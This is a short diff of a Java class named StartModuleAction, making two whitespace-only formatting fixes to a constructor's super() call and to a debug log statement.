@@ -30,7 +30,7 @@ public class StartModuleAction extends ModuleAction {
 	 *            the conf params
 	 */
 	public StartModuleAction(final ConfAction params) {
-		super( params);
+		super(params);
 	}
 
 	/*
@@ -41,7 +41,7 @@ public class StartModuleAction extends ModuleAction {
 	@Override
 	public boolean execute(Trigger trigger) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (execute): " + moduleId) ;//$NON-NLS-1$
+			Check.log(TAG + " (execute): " + moduleId);//$NON-NLS-1$
 		}
 		final ManagerAgent agentManager = ManagerAgent.self();
 
